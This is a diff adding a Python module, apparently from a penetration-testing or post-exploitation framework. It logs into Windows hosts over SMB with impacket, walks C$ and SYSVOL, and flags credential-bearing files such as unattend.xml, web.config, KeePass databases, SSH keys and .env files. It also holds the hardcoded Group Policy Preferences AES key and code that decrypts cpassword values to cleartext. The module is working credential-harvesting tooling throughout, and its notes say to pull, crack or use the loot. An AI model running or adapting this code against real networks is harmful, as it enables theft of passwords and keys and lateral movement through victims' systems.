@@ -1,0 +1,172 @@
+"""Phase 3 - file hunting over SMB (needs admin on the target for C$).
+Walks high-value locations and flags files that commonly hold credentials:
+unattend/sysprep, web.config and app configs, scripts, KeePass DBs, SSH/cloud/git
+creds, GPP Groups.xml (cpassword auto-decrypt), SYSVOL logon scripts. Small text
+files are grepped for credential keywords. Self-contained via impacket; fails
+gracefully if login fails or impacket is missing."""
+from __future__ import annotations
+
+import base64
+import os
+import re
+from io import BytesIO
+from typing import List, Tuple
+
+from core.credential import Credential
+from core.secret import Secret, Status
+from .base import BaseCollector
+
+MAX_FILE = 128 * 1024
+MAX_HITS = 400
+
+INTERESTING = re.compile(
+    r"(unattend\.xml|autounattend\.xml|sysprep\.(inf|xml)|web\.config|"
+    r"applicationhost\.config|.*\.config|.*\.ps1|.*\.psm1|.*\.bat|.*\.cmd|.*\.vbs|"
+    r".*\.kdbx|.*\.kdb|id_rsa|id_ed25519|id_dsa|.*\.ppk|\.git-credentials|"
+    r"credentials|\.env|wp-config\.php|.*\.rdp|.*\.ini|groups\.xml|services\.xml|"
+    r"scheduledtasks\.xml|datasources\.xml|.*\.ovpn|.*\.keepass)$", re.I)
+
+CRED_KW = re.compile(
+    r"(password|passwd|pwd|cpassword|secret|connectionstring|accountpassword|"
+    r"-asplaintext|convertto-securestring|api[_-]?key|aws_secret|client_secret|"
+    r"BEGIN [A-Z ]*PRIVATE KEY)", re.I)
+
+BINARY_LOOT = re.compile(r"(\.kdbx|\.kdb|id_rsa|id_ed25519|id_dsa|\.ppk|\.keepass)$", re.I)
+
+ROOTS: List[Tuple[str, str, int]] = [
+    ("C$", "Windows\\Panther", 1),
+    ("C$", "Windows\\System32\\sysprep", 1),
+    ("C$", "inetpub\\wwwroot", 3),
+    ("C$", "Users", 4),
+    ("C$", "Program Files\\Veeam", 2),
+    ("SYSVOL", "", 5),
+]
+
+GPP_KEY = bytes.fromhex(
+    "4e9906e8fcb66cc9faf49310620ffee8"
+    "f496e806cc057990209b09a433b66c1b")
+
+
+def _decrypt_cpassword(cpassword: str) -> str:
+    try:
+        from Cryptodome.Cipher import AES
+    except ImportError:
+        try:
+            from Crypto.Cipher import AES
+        except ImportError:
+            return ""
+    try:
+        pad = "=" * (-len(cpassword) % 4)
+        data = base64.b64decode(cpassword + pad)
+        pt = AES.new(GPP_KEY, AES.MODE_CBC, b"\x00" * 16).decrypt(data)
+        return pt[: -pt[-1]].decode("utf-16-le", errors="ignore")
+    except Exception:
+        return ""
+
+
+class FileHuntCollector(BaseCollector):
+    name = "FileHunt"
+    description = "SMB file hunt: unattend/configs/scripts/keepass/ssh/GPP (needs admin)"
+    per_credential = False
+    requires = ()
+
+    def collect_once(self, cred: Credential) -> List[Secret]:
+        try:
+            from impacket.smbconnection import SMBConnection
+        except ImportError:
+            return []
+        try:
+            conn = SMBConnection(self.host, self.host, timeout=self.timeout)
+            conn.login(cred.username, cred.password or "", cred.domain,
+                       cred.lmhash or "", cred.nthash or "")
+        except Exception:
+            return []
+
+        found: List[Secret] = []
+        self._count = 0
+        log = []
+        try:
+            for share, start, depth in ROOTS:
+                try:
+                    self._walk(conn, share, start, depth, found, log)
+                except Exception as e:
+                    log.append(f"[walk error] {share}\\{start}: {e}")
+        finally:
+            try:
+                conn.logoff()
+            except Exception:
+                pass
+        self._save_log(log)
+        return found
+
+    def _walk(self, conn, share, path, depth, found, log):
+        if depth < 0 or self._count >= MAX_HITS:
+            return
+        try:
+            entries = conn.listPath(share, (path + "\\*") if path else "*")
+        except Exception:
+            return
+        for e in entries:
+            name = e.get_longname()
+            if name in (".", ".."):
+                continue
+            full = f"{path}\\{name}" if path else name
+            if e.is_directory():
+                self._walk(conn, share, full, depth - 1, found, log)
+                continue
+            if not INTERESTING.match(name):
+                continue
+            self._count += 1
+            loc = f"\\\\{self.host}\\{share}\\{full}"
+            if BINARY_LOOT.search(name):
+                found.append(Secret(self.host, "FileHunt", "", loc, Status.INFO,
+                                    secret_type="file",
+                                    notes="key/DB file - pull & crack/use manually"))
+                log.append(f"[binary] {loc}")
+                continue
+            if e.get_filesize() > MAX_FILE:
+                found.append(Secret(self.host, "FileHunt", "", loc, Status.INFO,
+                                    secret_type="file", notes="large config - review"))
+                continue
+            data = self._read(conn, share, full)
+            if data is None:
+                continue
+            found += self._scan(data, loc, name, log)
+
+    def _read(self, conn, share, path):
+        try:
+            buf = BytesIO()
+            conn.getFile(share, path, buf.write)
+            return buf.getvalue().decode("utf-8", errors="ignore")
+        except Exception:
+            return None
+
+    def _scan(self, text, loc, name, log) -> List[Secret]:
+        out = []
+        for cm in re.finditer(r'cpassword="([^"]+)"', text):
+            pw = _decrypt_cpassword(cm.group(1))
+            un = re.search(r'userName="([^"]+)"', text)
+            out.append(Secret(self.host, "FileHunt", un.group(1) if un else "",
+                              pw or cm.group(1), Status.CLEARTEXT if pw else Status.INFO,
+                              target=loc, secret_type="password",
+                              notes="GPP cpassword" + ("" if pw else " (decrypt failed)")))
+        hits = 0
+        for ln in text.splitlines():
+            if CRED_KW.search(ln) and hits < 5:
+                out.append(Secret(self.host, "FileHunt", "", ln.strip()[:140],
+                                  Status.INFO, target=loc, secret_type="file-hit",
+                                  notes=f"in {name}"))
+                hits += 1
+        if out:
+            log.append(f"[hit] {loc} ({len(out)})")
+        return out
+
+    def _save_log(self, log):
+        try:
+            os.makedirs(self.raw_dir, exist_ok=True)
+            with open(os.path.join(self.raw_dir, "FileHunt.txt"), "w",
+                      encoding="utf-8", errors="ignore") as fh:
+                fh.write(f"# files inspected: {self._count}\n\n")
+                fh.write("\n".join(log))
+        except Exception:
+            pass
